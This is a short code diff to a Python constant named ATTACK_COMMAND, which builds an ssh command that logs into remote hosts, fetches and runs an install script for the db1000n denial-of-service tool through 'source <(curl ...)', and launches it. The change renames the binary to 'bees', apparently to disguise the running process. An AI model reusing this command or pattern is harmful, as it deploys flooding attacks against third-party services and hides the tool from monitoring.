@@ -24,7 +24,8 @@ CAW_KEYS_DIR = f'caw_keys{os.sep}'
 ATTACK_COMMAND = (
     'ssh -o StrictHostKeyChecking=no -i {caw_keys_dir}{email}__{host}__{port} cabox@{host} -p {port} '
     '-t "source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) {config_download} '
-    '&& ./db1000n -prometheus_on=false {config_arg} {needles_args}"'
+    '&& mv db1000n bees'
+    '&& ./bees -prometheus_on=false {config_arg} {needles_args}"'
 )
 
 
